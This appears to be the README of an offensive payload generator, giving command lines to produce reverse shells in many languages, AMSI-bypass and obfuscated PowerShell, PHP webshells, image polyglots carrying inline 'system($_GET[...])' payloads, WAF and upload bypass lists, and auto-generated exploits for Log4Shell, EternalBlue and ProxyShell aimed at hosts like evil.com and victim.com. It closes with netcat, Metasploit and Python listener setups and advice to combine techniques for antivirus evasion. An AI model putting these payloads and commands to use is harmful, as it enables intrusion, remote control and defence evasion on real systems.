<p align="center">
  <a href="https://www.python.org">
    <img src="https://img.shields.io/badge/Python-3.10+-3776AB?logo=python&logoColor=white"/>
  </a>

  <a href="https://pip.pypa.io">
    <img src="https://img.shields.io/badge/Pip-Package_Manager-3775A9?logo=python&logoColor=white"/>
  </a>

  <a href="https://virtualenv.pypa.io">
    <img src="https://img.shields.io/badge/Virtualenv-Environment-4B8BBE?logo=python&logoColor=white"/>
  </a>
</p>


<p align="center">
  <img src="Img/Payload.png" width="900"/>
</p>

## 𝘱𝘢𝘺𝘭𝘰𝘢𝘥 𝘣𝘺 𝘣𝘭4𝘤𝘬𝘻𝘶𝘴
𝑅𝐸𝒱𝐸𝑅𝒮𝐸 𝒮𝐻𝐸𝐿𝐿 𝒢𝐸𝒩𝐸𝑅𝒜𝒯𝐼𝒪𝒩 𝒪𝐵𝐹𝒰𝒮𝒞𝒜𝒯𝐸𝒟 𝒫𝒜𝒴𝐿𝒪𝒜𝒟𝒮 𝐵𝒜𝒯𝒞𝐻 𝒢𝐸𝒩𝐸𝑅𝒜𝒯𝐼𝒪𝒩 𝐿𝒾𝓃𝓊𝓍 𝒫𝒶𝓎𝓁𝑜𝒶𝒹𝓈 𝒲𝐸𝐵𝒮𝐻𝐸𝐿𝐿 𝒫𝒪𝐿𝒴𝒢𝐿𝒪𝒯 𝐹𝐼𝐿𝐸 𝒲𝒜𝐹 𝐵𝒴𝒫𝒜𝒮𝒮 𝐹𝐼𝐿𝐸 𝒰𝒫𝐿𝒪𝒜𝒟 𝐵𝒴𝒫𝒜𝒮𝒮 𝒜𝒰𝒯𝒪-𝐸𝒳𝒫𝐿𝒪𝐼𝒯 𝑀𝒪𝒟𝒰𝐿𝐸.

## Install 
```bash
git clone
cd
ls / dir
```
## Command Using 
1. REVERSE SHELL GENERATION
```bash
[Note] Window Payloads

# PowerShell Reverse Shell (Basic)
python payload.py --ip 192.168.1.100 --port 4444 --language powershell

# PowerShell One-Liner
python payload.py --ip 192.168.1.100 --port 4444 --language powershell_oneliner

# PowerShell Base64 Encoded (Bypass basic detection)
python payload.py --ip 192.168.1.100 --port 4444 --language powershell_b64

# PowerShell with AMSI Bypass (Evade Windows Defender)
python payload.py --ip 192.168.1.100 --port 4444 --language amsi_bypass

# Memory-Only PowerShell (No disk write)
python payload.py --ip 192.168.1.100 --port 4444 --language memory_only

# Windows Batch Script
python payload.py --ip 192.168.1.100 --port 4444 --language batch

# CMD with Ncat
python payload.py --ip 192.168.1.100 --port 4444 --language cmd_ncat

# ASPX Reverse Shell
python payload.py --ip 192.168.1.100 --port 4444 --language aspx
```
```bash
[ Note ] Linux Payloads

# PHP Reverse Shell
python3 payload.py --ip 192.168.1.100 --port 4444 --language php

# Python Reverse Shell
python3 payload.py --ip 192.168.1.100 --port 4444 --language python

# Perl Reverse Shell
python3 payload.py --ip 192.168.1.100 --port 4444 --language perl

# Ruby Reverse Shell
python3 payload.py --ip 192.168.1.100 --port 4444 --language ruby

# Node.js Reverse Shell
python3 payload.py --ip 192.168.1.100 --port 4444 --language nodejs

# JSP Reverse Shell
python3 payload.py --ip 192.168.1.100 --port 4444 --language jsp

# ICMP Reverse Shell (Bypass TCP/UDP)
python3 payload.py --ip 192.168.1.100 --port 4444 --language icmp

# DNS Tunneling Shell
python3 payload.py --ip attacker.dns-server.com --port 53 --language dns

# WebSocket Shell
python3 payload.py --ip ws://192.168.1.100 --port 8080 --language websocket
```
2. OBFUSCATED PAYLOADS
```bash
# PHP with 3-layer obfuscation
python3 payload.py --ip 192.168.1.100 --port 4444 --language php --obfuscate --layers 3

# PHP with 7-layer deep obfuscation
python3 500payload.py --ip 192.168.1.100 --port 4444 --language php --obfuscate --layers 7

# PowerShell with obfuscation (auto base64)
python3 payload.py --ip 192.168.1.100 --port 4444 --language powershell --obfuscate

# Save obfuscated payload to file
python3 payload.py --ip 192.168.1.100 --port 4444 --language php --obfuscate --output obfuscated_shell.php
```
3. BATCH GENERATION
```bash
[Note] All Window Payload

# Generate all Windows payloads (20+ variants)
python payload.py --ip 192.168.1.100 --port 4444 --all-windows

# Save to JSON file
python payload.py --ip 192.168.1.100 --port 4444 --all-windows --output windows_all.json

# Verbose output
python payloadpy --ip 192.168.1.100 --port 4444 --all-windows --verbose
```
```bash
[Note] All Kali Payload

# Generate all Linux payloads
python3 payload.py --ip 192.168.1.100 --port 4444 --all-linux

# Save to file
python3 payload.py --ip 192.168.1.100 --port 4444 --all-linux --output linux_all.json
```
4. WEBSHELL GENERATION
```bash
# PHP Webshell with custom parameter
python3 payload.py --webshell --webshell-lang php --cmd-param exec

# ASP Webshell
python3 payload.py --webshell --webshell-lang asp --cmd-param cmd

# JSP Webshell
python3 500payload.py --webshell --webshell-lang jsp --cmd-param x

# ASPX Webshell
python3 payload.py --webshell --webshell-lang aspx --cmd-param command

# Save webshell to file
python3 payload.py --webshell --webshell-lang php --output webshell.php
```
5. POLYGLOT FILE GENERATION
```bash

# GIF + PHP polyglot
python3 payload.py --polyglot --payload 'system($_GET["cmd"]);' --formats gif

# Multiple formats (GIF, JPG, PNG, PDF)
python3 payload.py --polyglot --payload '<?php system("id"); ?>' --formats gif,jpg,png,pdf

# Custom payload with obfuscation
python3 payload.py --polyglot --payload 'eval($_POST["pwd"]);' --formats jpg,png

# Save polyglot files info
python3 payload.py --polyglot --payload 'system($_REQUEST["c"]);' --output polyglot.json
```
6. WAF BYPASS TECHNIQUES
```bash
# Show all WAF bypass payloads
python3 payload.py --waf-bypass

# Show with detailed output
python3 payload.py --waf-bypass --verbose

# Save WAF bypass techniques to file
python3 payload.py --waf-bypass --output waf_bypass.json

# Show specific count only
python3 payload.py --waf-bypass | grep payload_count
```
## Output includes:
```bash
1 SQL Injection (14 payloads)

2 XSS (13 payloads)

3 LFI (11 payloads)

4 Command Injection (13 payloads)

5 Windows Command Injection (10 payloads)
```
7. File Upload Bypass
```bash
# Show all file upload bypass techniques
python3 payload.py --upload-bypass

# Save to file
python3 payload.py --upload-bypass --output upload_bypass.json

# Verbose output
python3 payload.py --upload-bypass --verbose
```
## Includes:
```bash
1 Extension bypass (50+ extensions)

2 Content-Type bypass (10 types)

3 Null byte injection

4 Double extension

5 Magic bytes

6 Path traversal

7 Windows ADS streams
```
8. AUTO-EXPLOIT MODULE
```bash
# Generate Log4Shell exploit
python3 payload.py --auto-exploit --ip attacker.com --port 1389 --target victim.com

# Generate all exploits
python3 payload.py --auto-exploit --ip 192.168.1.100 --port 4444

# With specific target
python3 payload.py --auto-exploit --ip 10.0.0.1 --port 8080 --target exchange.victim.com

# Save exploits to file
python3 payload.py --auto-exploit --ip evil.com --port 80 --output exploits.json
```
## Exploits included:
```bash
1 Log4Shell (CVE-2021-44228)

2 Spring4Shell (CVE-2022-22965)

3 Heartbleed (CVE-2014-0160)

4 EternalBlue (MS17-010)

5 ProxyShell (Exchange CVEs)
```
9. SAVE & OUTPUT OPTIONS
```bash
# Save as JSON
python3 payload.py --ip 10.0.0.1 --port 4444 --language powershell --output shell.json

# Save as JSON + auto create raw file
python3 payload.py --ip 10.0.0.1 --port 4444 --language php --obfuscate --output result.json --verbose

# Output to console only (no save)
python3 payload.py --ip 10.0.0.1 --port 4444 --language python

# Compact output
python3 payload.py --ip 10.0.0.1 --port 4444 --language perl --output /tmp/payload.json
```
10. ADVANCED COMBINATIONS
```bash
# Windows reverse shell with AMSI bypass + obfuscation
python payload.py --ip 192.168.1.100 --port 4444 --language amsi_bypass --obfuscate

# Linux PHP with deep obfuscation + save
python3 payload.py --ip 10.0.0.1 --port 5555 --language php --obfuscate --layers 10 --output hard_shell.php

# All Windows payloads + WAF bypass techniques
python payload.py --ip 192.168.1.100 --port 4444 --all-windows --output full_attack.json

# Generate polyglot + webshell combination
python 500payload.py --polyglot --payload '<?php system($_GET["cmd"]); ?>' --formats gif,jpg

# Auto exploit + reverse shell generation
python payload.py --auto-exploit --ip 10.0.0.1 --port 4444 --target victim.com
```
11. LISTENER SETUP (Manual)
```bash
# Linux
nc -lvnp 4444

# Windows (with ncat)
ncat -lvnp 4444
```
Metasploit Listener:
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j
```
Custom Python Listener:
```bash
# listener.py
import socket
s = socket.socket()
s.bind(('0.0.0.0', 4444))
s.listen(1)
conn, addr = s.accept()
while True:
    cmd = input("Shell> ")
    conn.send(cmd.encode() + b'\n')
    print(conn.recv(4096).decode())
```
12. QUICK REFERENCE CARD
```bash
    Purpose	                           Command
Basic reverse shell     	--ip IP --port PORT --language LANG
Obfuscated payload	          --obfuscate --layers N
All Windows payloads	           --all-windows
All Linux payloads	               --all-linux
Generate webshell	                  --webshell
Generate polyglot	            --polyglot --payload "CODE"
WAF bypass list	                    --waf-bypass
Upload bypass list	               --upload-bypass
Auto exploit	                      --auto-exploit
Save to file	                    --output FILE.json
Verbose output	                       --verbose
```
⚠️ IMPORTANT NOTES

Authorization Required - Use only on systems you own or have permission to test

Firewall Considerations - Ensure your listener port is open

AV Evasion - Combine multiple techniques for better results

Testing - Always test in lab environment first

Logging - Use --verbose flag for debugging

